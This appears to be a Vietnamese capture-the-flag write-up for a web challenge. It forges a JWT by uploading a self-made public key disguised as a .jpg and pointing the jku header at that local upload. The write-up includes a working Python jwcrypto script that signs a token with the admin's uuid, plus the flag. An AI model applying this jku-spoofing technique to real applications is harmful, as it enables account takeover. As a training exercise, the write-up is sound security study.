# Foobar - The Photo Exhibit

Chall cho source code.

Truy cập -> trang web có tính năng đăng kí và đăng nhập. Sau khi đăng nhập ta có thể upload ảnh lên server.

## Enumeration

Sau khi đăng kí và đăng nhập với tên user là `jang` ta được cookie:
```
sessio=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImMwZmM2YjZhLTA3Y2ItNDA5Mi1iYzUzLThlOWUwM2Y5ZGFjNCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1dWlkIjoiMGM2OTYzNGUtZDA3Ny00OWIwLTgwMjktZWVlNDRjZDQ2NmYyIiwiaWF0IjoxNjQ2NTYyNDM4fQ.LmkW0tCrwvQ7adUMRn5FACWH4BsegvLInjIbATqQaLHQIySyj8B4jjOyKc1x2mIEkaVslKgttoYYe6zprw-aGWPsUpTHhDvrs2I-plvevWStjhBNZ-TBDqa1rz1uZfXyFoH72-CVElAHVDS6xat7mw9i1i0Xehfx5oMuwxvUf3At4fK08vq35OVJHoyCoA-EI5yOFxMAXZymuEXQenRUBphfPHE86dXwI8m7eeZgLZx5hXH8wBn5Tc2esWYe4oKabLE7mrO4Kdz0zE_9yBrzlCR1GGGvwNHmWwJXFYx-axQdJtMYGEdE7QsgNNTHi23n6RMiRGHwZhctwBZQlPTeJQ
```

Decode(`jwt.io`):
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "c0fc6b6a-07cb-4092-bc53-8e9e03f9dac4",
  "jku": "http://localhost:3000/.well-known/jwks.json"
}.
{
  "uuid": "0c69634e-d077-49b0-8029-eee44cd466f2",
  "iat": 1646562438
}....
```

Web có sử dụng `jwt cookies` để xác thực user, ở phần header ta biết rằng algorithm là `RS256` có chứa `jwk`(json web key) trỏ đến 1 link host `public key`.

## Exploit

Sau 1 hồi review source-code ta biết được các step để exploit

1. Tìm `uuid` của `admin`

2. Tìm cách thay đổi JWT cookie

3. Login in as admin -> `flag`

### Step 1
Thử upload ảnh lên ta tìm được path chứa ảnh upload. So sánh tên file với `uuid` của ta, ta nhận thấy cấu trúc tên file sau khi được upload là: `[username]-[uuid]-[random-string].jpg`

Inspect source-code ta cũng tìm được ảnh background mà do chính `admin` upload, từ đó ta tìm được `uuid` của admin là: `683999a1-8bea-4278-876a-5ba278ea7917`

![uploads path expose admin uuid](admin-uuid.png)

### Step 2
Truy cập: http://chall.nitdgplug.org:30623/.well-known/jwks.json ta có được public key. 

![pub key](pubkey.png)

Ngoài ra file chứa `jwk` phải thuộc localhost.
```python
if (header.jku.lastIndexOf('http://localhost:3000', 0) !== 0)
    res.status(500)
    return
```

Vì thuật toán được gán chặt trong source-code là `RS256` nên thay đổi alg ở header thành `HS256` rồi tự sign bằng public-key có được để exploit là không thể.

Tuy nhiên vì có tính năng upload file(ảnh) nên ta nghĩ ngay đến tự generate ra RSA key để tự sign jwt cookie rồi upload `public key` lên server với `jwk header` của jwt trỏ đến file upload đó.

**References**: https://jwcrypto.readthedocs.io/en/latest/jwk.html

**Step 1**: generate RSA pair key
```bash
openssl genrsa -out keypair.pem 2048
```

**Step 2**: retrive public key from private key and sign our own token. Lưu ý format của jwk và jwt.
```python
#!/usr/bin/env python3
from jwcrypto import jwk, jwt
import json

with open("keypair.pem", "rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())

pubkey = key.export(private_key=False)

jwks = {}
jwks["keys"] = [json.loads(pubkey)]

# Vì server white list image extension nên đuôi file phải là .jpg, nhưng ta chỉ cần đọc file dưới dạng text nên không sao cả.
with open('jwks.jpg', 'w') as f: # upload
  f.write(json.dumps(jwks))

# Ở đây sau khi có được file ta cần tự add thêm các cặp alg, kty, use... để giống vời jwk format trên server

# Sau khi upload jwtksjwks.jpg tên, ta được upload path chứa public-key. Thế path này vào jku(Json web Key set URL)
token = jwt.JWT(
    header={
        "alg": "RS256",
        "typ": "JWT",
        "kid": key.key_id, # kid!!
        "jku": "http://localhost:3000/uploads/jang-0c69634e-d077-49b0-8029-eee44cd466f2-4fcbb882ac9238db0261955fef6cbbb0-10e5b9.jpg"
    },
    claims={
        "uuid": "683999a1-8bea-4278-876a-5ba278ea7917", # admin uuid
        "iat": 1646470816
    }
)


token.make_signed_token(key)

print(token.serialize())
```

Thế thôi đó. Thay cookie cũ với cái ta tự generate được là login as admin được rồi.

**flag**: `GLUG{D035_4ny0n3_us3_jwk5??}`
